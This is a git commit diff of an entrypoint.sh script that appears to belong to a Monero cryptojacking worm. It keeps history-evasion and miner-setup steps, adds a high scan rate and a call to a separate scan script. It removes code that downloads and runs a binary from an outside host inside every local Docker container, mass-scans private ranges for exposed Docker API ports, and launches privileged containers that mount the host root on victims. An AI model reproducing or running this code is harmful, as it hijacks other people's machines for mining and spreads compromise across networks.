523604f3c948c2814b6336ea591f2a0a52b98d2b
ToRxmrig <79212597+ToRxmrig@users.noreply.github.com>
2024-09-04 04:24:01 -0500

    Update entrypoint.sh

--- entrypoint.sh
+++ entrypoint.sh
@@ -3,11 +3,9 @@
 unset HISTFILE
 export LC_ALL=C
 export PATH="$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:/usr/games:/usr/local/games"
+export SCAN_RATE=500000
 
-RATE="50000"
-SETUP_SLEEP="1"
-TARGET="localhost" # Define TARGET appropriately
-LAN_RANGES=("10.0.0.0/8" "172.16.0.0/12" "192.168.0.0/16" "169.254.0.0/16" "100.64.0.0/10")
+
 
 # Log function
 log() {
@@ -16,15 +14,13 @@ log() {
 }
 
 # Main initialization function
-INIT_MAIN() {
+function INIT_MAIN() {
     SETUP_BASICS
     SETUP_SYSTEM
     SETUP_TOOLS
     SETUP_MSCAN
     SETUP_XMR
-    INFECT_ALL_CONTAINERS
-    GETLOCALRANGES
-    feed_the_ranges
+    bash /root/scan.sh
 }
 
 # Install basic packages
@@ -77,55 +73,5 @@ SETUP_XMR() {
     log "Finished SETUP_XMR"
 }
 
-# Infect all containers
-INFECT_ALL_CONTAINERS() {
-    log "Starting INFECT_ALL_CONTAINERS"
-    local UPSPINTEST="http://x86.anondns.net/sbin"
-    docker ps --quiet | while read -r container_id; do
-        docker exec --privileged -d "$container_id" sh -c "apk update; apk add wget curl; mkdir -p /var/tmp/; wget --no-check-certificate $UPSPINTEST -O /var/tmp/sbin; chmod +x /var/tmp/sbin; /var/tmp/sbin || curl -sLk $UPSPINTEST -o /var/tmp/sbin" || { log "Failed to infect container $container_id"; exit 1; }
-    done
-    log "Finished INFECT_ALL_CONTAINERS"
-}
 
-# Get local IP ranges
-GETLOCALRANGES() {
-    log "Starting GETLOCALRANGES"
-    ip route show | awk '{print $1}' | grep "/" > /tmp/.lr || { log "Failed to get local ranges"; exit 1; }
-    log "Finished GETLOCALRANGES"
-}
-
-# Scan and exploit Docker services
-dAPIpwn() {
-    local range="$1"
-    local port="$2"
-    local rate="$3"
-    local rndstr
-    rndstr=$(head /dev/urandom | tr -dc a-z | head -c 6)
-
-    ip_list=$(masscan --router-mac 66-55-44-33-22-11 "$range" -p"$port" --rate="$rate" | awk '{print $6}' | zgrab --senders 200 --port "$port" --http='/v1.16/version' --output-file=- 2>/dev/null | grep -E 'ApiVersion|client version 1.16' | jq -r .ip) || { log "Failed to scan range $range on port $port"; exit 1; }
-
-    for ipaddy in $ip_list; do
-        timeout -s SIGKILL 120 docker -H "$TARGET" run -d --net host --restart always --privileged --name nginx -v /:/host nmlmweb3/upspin || { log "Failed to run Docker container on $ipaddy"; exit 1; }
-    done
-}
-
-# Process local ranges and perform scans
-feed_the_ranges() {
-    log "Starting feed_the_ranges"
-    clear
-    echo "Scanning local ranges"
-    sleep 2
-    clear
-
-    for LRANGE in "${LAN_RANGES[@]}"; do
-        dAPIpwn "$LRANGE" 2375 "$RATE"
-        dAPIpwn "$LRANGE" 2376 "$RATE"
-        dAPIpwn "$LRANGE" 2377 "$RATE"
-        dAPIpwn "$LRANGE" 4243 "$RATE"
-        dAPIpwn "$LRANGE" 4244 "$RATE"
-    done
-    log "Finished feed_the_ranges"
-}
-
-# Start the script
 INIT_MAIN
